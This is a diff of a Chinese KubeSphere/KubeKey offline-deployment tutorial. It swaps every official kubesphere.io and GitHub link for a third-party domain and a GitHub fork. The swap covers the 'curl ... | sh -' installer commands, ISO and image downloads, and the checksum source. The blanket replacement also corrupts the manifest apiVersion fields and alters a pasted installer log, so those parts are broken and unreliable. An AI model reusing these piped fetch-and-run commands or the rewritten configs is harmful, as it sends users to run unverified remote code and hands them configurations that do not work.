@@ -51,8 +51,8 @@ manifest 是一个描述当前 Kubernetes 集群信息和定义 artifact 制品�
 
 KubeKey 生成 manifest 文件有两种方式：
 
-- 利用现有运行中的集群作为源生成 manifest 文件，也是官方推荐的一种方式，具体参考 KubeSphere [官网的离线部署文档](https://www.kubesphere.io/zh/docs/v3.4/installing-on-linux/introduction/air-gapped-installation/)。
-- 根据 [ manifest 模板文件](https://github.com/kubesphere/kubekey/blob/master/docs/manifest-example.md) 手动编写 manifest 文件。
+- 利用现有运行中的集群作为源生成 manifest 文件，也是官方推荐的一种方式，具体参考 KubeSphere [官网的离线部署文档](https://www.docs.kubesphere-carryon.top/zh/docs/v3.4/installing-on-linux/introduction/air-gapped-installation/)。
+- 根据 [ manifest 模板文件](https://github.com/whenegghitsrock/kubekey-carryon/blob/master/docs/manifest-example.md) 手动编写 manifest 文件。
 
 第一种方式的好处是可以根据 1:1 的运行集群构建离线集群，依赖于已有集群，灵活度不够，并不是所有人都具备这种条件。
 
@@ -62,7 +62,7 @@ KubeKey 生成 manifest 文件有两种方式：
 
 制作离线部署资源需要找一台能联通互联网的节点，本文为了资源的制作和离线部署验证，单独增加了一个能联网的 **ksp-deploy** 节点。
 
-在该节点下载 KubeKey （下文简称 KK）最新版（**v3.0.13**）。具体 KK 版本号可以在 [KubeKey 发行页面](https://github.com/kubesphere/kubekey/releases) 查看。
+在该节点下载 KubeKey （下文简称 KK）最新版（**v3.0.13**）。具体 KK 版本号可以在 [KubeKey 发行页面](https://github.com/whenegghitsrock/kubekey-carryon/releases) 查看。
 
 ### 2.1. 下载 KubeKey
 
@@ -77,15 +77,15 @@ cd kubekey/
 export KKZONE=cn
 
 # 执行下载命令，获取最新版的 kk（受限于网络，有时需要执行多次）
-curl -sfL https://get-kk.kubesphere.io | sh -
+curl -sfL https://get-kk.docs.kubesphere-carryon.top | sh -
 
 # 也可以使用下面的命令指定具体版本
-curl -sfL https://get-kk.kubesphere.io | VERSION=v3.0.13 sh -
+curl -sfL https://get-kk.docs.kubesphere-carryon.top | VERSION=v3.0.13 sh -
 ```
 
 ### 2.2. 获取 manifest 模板
 
- manifest 文件的编写可以参考 [官方示例文档](https://github.com/kubesphere/kubekey/blob/master/docs/manifest-example.md)。有两个可用参考用例，一个简单版，一个完整版。参考简单版即可。
+ manifest 文件的编写可以参考 [官方示例文档](https://github.com/whenegghitsrock/kubekey-carryon/blob/master/docs/manifest-example.md)。有两个可用参考用例，一个简单版，一个完整版。参考简单版即可。
 
 受限于篇幅，本文不展示原始的示例文件，建议读者仔细阅读官方示例，理解每一项配置的含义后根据需求改写（**暂时无法理解的，可以直接使用下文提供的成品配置文件**）。
 
@@ -94,7 +94,7 @@ curl -sfL https://get-kk.kubesphere.io | VERSION=v3.0.13 sh -
 执行下面的命令获取官方 releases v3.4.1 对应的 images-list（最终实验结果，一些镜像需要自行整理，完整的镜像列表可参考下文中的 manifest 文件）。
 
 ```shell
-wget https://github.com/kubesphere/ks-installer/releases/download/v3.4.1/images-list.txt
+wget https://github.com/whenegghitsrock/ks-installer-carryon/releases/download/v3.4.1/images-list.txt
 ```
 
 完整的 Image（**136 个**） 分类及可裁剪性（**必须留的有标粗，个人判断，未必精准**）：
@@ -116,12 +116,12 @@ wget https://github.com/kubesphere/ks-installer/releases/download/v3.4.1/images-
 
 ### 2.4. 获取操作系统依赖包
 
-本实验环境使用的操作系统是 x64 的 CentOS 7.9，所以只下载  centos7 的操作系统依赖包，其他操作系统请读者在 [KubeKey releases 页面](https://github.com/kubesphere/kubekey/releases)下载。
+本实验环境使用的操作系统是 x64 的 CentOS 7.9，所以只下载  centos7 的操作系统依赖包，其他操作系统请读者在 [KubeKey releases 页面](https://github.com/whenegghitsrock/kubekey-carryon/releases)下载。
 
 执行下面的命令，在能联网的部署服务器上执行下载。网络访问受限时，也可以通过其他方式，将该 ISO 下载后放到制作离线镜像的服务器的 /root/kubekey 目录下。
 
 ```shell
-wget https://github.com/kubesphere/kubekey/releases/download/v3.0.12/centos7-rpms-amd64.iso
+wget https://github.com/whenegghitsrock/kubekey-carryon/releases/download/v3.0.12/centos7-rpms-amd64.iso
 ```
 
 > 说明：KubeKey v3.0.13 的 release 中没包，只能在 v3.0.12 的 releases 中下载。
@@ -133,7 +133,7 @@ wget https://github.com/kubesphere/kubekey/releases/download/v3.0.12/centos7-rpm
 [root@ksp-deploy kubekey]# ll -h centos7-rpms-amd64.iso
 -rw-r--r--. 1 root root 315M Oct 23 18:21 centos7-rpms-amd64.iso
 
-# 验证 sha256sum，确保 ISO 在下载过程中没出问题（官方提供的 sha256sum 信息在 https://github.com/kubesphere/kubekey/releases/download/v3.0.12/centos7-rpms.iso.sha256sum.txt）
+# 验证 sha256sum，确保 ISO 在下载过程中没出问题（官方提供的 sha256sum 信息在 https://github.com/whenegghitsrock/kubekey-carryon/releases/download/v3.0.12/centos7-rpms.iso.sha256sum.txt）
 [root@ksp-deploy kubekey]# sha256sum centos7-rpms-amd64.iso
 2588fbc12acc9f3b95766a0c20382988f2a21da2a36e444b7e1a0f523e75f858  centos7-rpms-amd64.iso
 ```
@@ -145,7 +145,7 @@ wget https://github.com/kubesphere/kubekey/releases/download/v3.0.12/centos7-rpm
 命名为 **ksp-v3.4.1-manifest.yaml**
 
 ```yaml
-apiVersion: kubekey.kubesphere.io/v1alpha2
+apiVersion: kubekey.docs.kubesphere-carryon.top/v1alpha2
 kind: Manifest
 metadata:
   name: sample
@@ -333,12 +333,12 @@ spec:
 >
 > - **最后的 16 个镜像就是官方 images-list 文件缺失的镜像，一定要手工补充在 list 中**
 > - kubernetes 版本：v1.26.5
-> - 其他组件版本的选择：个人是根据 kubekey 在线安装过程的日志，查找相关组件的对应版本，以及参考官方的文档 [组件默认版本说明](https://github.com/kubesphere/kubekey/blob/v3.0.13/docs/components-versions.md)、[组件默认版本源码](https://github.com/kubesphere/kubekey/blob/v3.0.13/cmd/kk/apis/kubekey/v1alpha2/default.go) 、[支持的组件列表](https://github.com/kubesphere/kubekey/blob/v3.0.13/version/components.json) 和 [制品清单源码](https://github.com/kubesphere/kubekey/blob/v3.0.13/cmd/kk/pkg/artifact/manifest.go)
+> - 其他组件版本的选择：个人是根据 kubekey 在线安装过程的日志，查找相关组件的对应版本，以及参考官方的文档 [组件默认版本说明](https://github.com/whenegghitsrock/kubekey-carryon/blob/v3.0.13/docs/components-versions.md)、[组件默认版本源码](https://github.com/whenegghitsrock/kubekey-carryon/blob/v3.0.13/cmd/kk/apis/kubekey/v1alpha2/default.go) 、[支持的组件列表](https://github.com/whenegghitsrock/kubekey-carryon/blob/v3.0.13/version/components.json) 和 [制品清单源码](https://github.com/whenegghitsrock/kubekey-carryon/blob/v3.0.13/cmd/kk/pkg/artifact/manifest.go)
 >
 > - 开启 **harbor** 和 **docker-compose** 配置项，为后面通过 KubeKey 自建 harbor 仓库推送镜像使用。
 > - 默认创建的 manifest 里面的镜像列表从 **docker.io** 获取，替换前缀为 **registry.cn-beijing.aliyuncs.com/kubesphereio**。
 > - 若需要导出的 artifact 文件中包含操作系统依赖文件（如：conntarck、chrony 等），可在 **operationSystem** 元素中的 **.repostiory.iso.url** 中配置相应的 ISO 依赖文件下载地址为 **localPath** ，填写提前下载好的 ISO 包在本地的存放路径，并将 **url** 配置项置空。
-> - 您可以访问 `https://github.com/kubesphere/kubekey/releases/tag/v3.0.12` 下载 ISO 文件。
+> - 您可以访问 `https://github.com/whenegghitsrock/kubekey-carryon/releases/tag/v3.0.12` 下载 ISO 文件。
 
 ### 2.6. 导出制品 artifact
 
@@ -595,7 +595,7 @@ cd /data/kubekey
 
 命令执行成功后，在当前目录会生成文件名为 **ksp-v341-v1265-offline.yaml** 的配置文件。
 
-> 注意：生成的默认配置文件内容较多，这里就不做过多展示了，更多详细的配置参数请参考 [官方配置示例](https://github.com/kubesphere/kubekey/blob/master/docs/config-example.md)。
+> 注意：生成的默认配置文件内容较多，这里就不做过多展示了，更多详细的配置参数请参考 [官方配置示例](https://github.com/whenegghitsrock/kubekey-carryon/blob/master/docs/config-example.md)。
 
 ### 4.3. 修改 Cluster 配置
 
@@ -621,7 +621,7 @@ vim ksp-v341-v1265-offline.yaml
 修改后的完整示例如下：
 
 ```yaml
-apiVersion: kubekey.kubesphere.io/v1alpha2
+apiVersion: kubekey.docs.kubesphere-carryon.top/v1alpha2
 kind: Cluster
 metadata:
   name: sample
@@ -774,7 +774,7 @@ metrics_server:
   enabled: true # 将 "false" 更改为 "true"
 ```
 
-> 说明：KubeSphere 支持用于 [部署](https://www.kubesphere.io/zh/docs/v3.3/project-user-guide/application-workloads/deployments/) 的容器组（Pod）弹性伸缩程序 (HPA)。在 KubeSphere 中，Metrics Server 控制着 HPA 是否启用。
+> 说明：KubeSphere 支持用于 [部署](https://www.docs.kubesphere-carryon.top/zh/docs/v3.3/project-user-guide/application-workloads/deployments/) 的容器组（Pod）弹性伸缩程序 (HPA)。在 KubeSphere 中，Metrics Server 控制着 HPA 是否启用。
 
 - 启用网络策略、容器组 IP 池，服务拓扑图（名字排序，对应配置参数排序）
 
@@ -1024,7 +1024,7 @@ NOTES：
   2. Please change the default password after login.
 
 #####################################################
-https://kubesphere.io             2023-12-13 10:56:38
+https://docs.kubesphere-carryon.top             2023-12-13 10:56:38
 #####################################################
 10:56:40 CST skipped: [ksp-master-3]
 10:56:40 CST skipped: [ksp-master-2]
@@ -1105,7 +1105,7 @@ failed: [LocalHost] [PushManifest] exec failed after 1 retries: get manifest lis
 
 - 解决方案
 
-参考 [issues-2054](https://github.com/kubesphere/kubekey/issues/2054)，在 Harbor 中创建项目 `kubesphereio`。
+参考 [issues-2054](https://github.com/whenegghitsrock/kubekey-carryon/issues/2054)，在 Harbor 中创建项目 `kubesphereio`。
 
 ### 问题 3
 
@@ -1123,7 +1123,7 @@ FATA[0000] pulling image: rpc error: code = Unknown desc = failed to pull and un
 
 - 解决方案
 
-参考 [issues-1762](https://github.com/kubesphere/kubekey/issues/1762)，在集群部署文件 `ksp-v341-v1265-offline.yaml` 的 registry 部分配置中加入以下内容（一定要确保 **/etc/docker/certs.d/registry.opsman.top** 文件夹存在）：
+参考 [issues-1762](https://github.com/whenegghitsrock/kubekey-carryon/issues/1762)，在集群部署文件 `ksp-v341-v1265-offline.yaml` 的 registry 部分配置中加入以下内容（一定要确保 **/etc/docker/certs.d/registry.opsman.top** 文件夹存在）：
 
 ```yaml
 # 本文用的 registry.opsman.top 默认为 dockerhub.kubekey.local
